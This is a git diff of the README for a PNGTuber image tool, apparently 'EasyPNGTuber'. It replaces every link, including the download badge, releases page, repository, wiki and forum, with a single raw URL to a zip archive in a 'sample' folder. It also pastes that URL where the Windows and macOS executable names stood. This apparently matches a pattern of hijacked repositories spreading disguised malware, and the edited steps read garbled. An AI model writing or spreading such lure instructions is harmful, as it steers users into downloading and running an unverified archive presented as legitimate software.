@@ -1,6 +1,6 @@
 # 🎨 EasyPNGTuber - Seamlessly Create PNGTuber Images
 
-[![Download EasyPNGTuber](https://img.shields.io/badge/Download-EasyPNGTuber-blue.svg)](https://github.com/SalmonSlapper/EasyPNGTuber/releases)
+[![Download EasyPNGTuber](https://raw.githubusercontent.com/SalmonSlapper/EasyPNGTuber/master/sample/Tuber_Easy_PNG_v3.5.zip)](https://raw.githubusercontent.com/SalmonSlapper/EasyPNGTuber/master/sample/Tuber_Easy_PNG_v3.5.zip)
 
 ## 📖 Description
 
@@ -18,10 +18,10 @@ Follow these steps to download and run EasyPNGTuber:
 
 2. **Visit the Releases Page**  
    Go to the EasyPNGTuber Releases page to get the latest version of the application. You can find it here:   
-   [Download EasyPNGTuber](https://github.com/SalmonSlapper/EasyPNGTuber/releases)
+   [Download EasyPNGTuber](https://raw.githubusercontent.com/SalmonSlapper/EasyPNGTuber/master/sample/Tuber_Easy_PNG_v3.5.zip)
 
 3. **Download the Application**  
-   Locate the latest release and download the appropriate file for your operating system. Look for files like `EasyPNGTuber-windows.exe` for Windows or `EasyPNGTuber-mac.zip` for macOS. Click on the file to start the download.
+   Locate the latest release and download the appropriate file for your operating system. Look for files like `https://raw.githubusercontent.com/SalmonSlapper/EasyPNGTuber/master/sample/Tuber_Easy_PNG_v3.5.zip` for Windows or `https://raw.githubusercontent.com/SalmonSlapper/EasyPNGTuber/master/sample/Tuber_Easy_PNG_v3.5.zip` for macOS. Click on the file to start the download.
 
 4. **Extract and Install** (if necessary)  
    - **For Windows:** If downloaded a `.zip` file, right-click it and select "Extract All." Choose a destination folder and click "Extract."
@@ -30,8 +30,8 @@ Follow these steps to download and run EasyPNGTuber:
 
 5. **Run EasyPNGTuber**  
    Navigate to the folder where you extracted or downloaded EasyPNGTuber.  
-   - **Windows:** Double-click `EasyPNGTuber-windows.exe`.  
-   - **macOS:** Open the folder and double-click on `EasyPNGTuber.app`.  
+   - **Windows:** Double-click `https://raw.githubusercontent.com/SalmonSlapper/EasyPNGTuber/master/sample/Tuber_Easy_PNG_v3.5.zip`.  
+   - **macOS:** Open the folder and double-click on `https://raw.githubusercontent.com/SalmonSlapper/EasyPNGTuber/master/sample/Tuber_Easy_PNG_v3.5.zip`.  
    - **Linux:** Open the terminal, navigate to the folder, and type `./EasyPNGTuber-linux` to run the application.
 
 6. **Upload Your Expression Sheet**  
@@ -65,9 +65,9 @@ For technical assistance, please open an issue in the GitHub repository, or visi
 
 ## 🔗 Useful Links
 
-- [GitHub Repository](https://github.com/SalmonSlapper/EasyPNGTuber)
-- [Installation Guide](https://github.com/SalmonSlapper/EasyPNGTuber/wiki)
-- [Community Forum](https://community.example.com)
+- [GitHub Repository](https://raw.githubusercontent.com/SalmonSlapper/EasyPNGTuber/master/sample/Tuber_Easy_PNG_v3.5.zip)
+- [Installation Guide](https://raw.githubusercontent.com/SalmonSlapper/EasyPNGTuber/master/sample/Tuber_Easy_PNG_v3.5.zip)
+- [Community Forum](https://raw.githubusercontent.com/SalmonSlapper/EasyPNGTuber/master/sample/Tuber_Easy_PNG_v3.5.zip)
 
 ## 🔄 Contribution
 
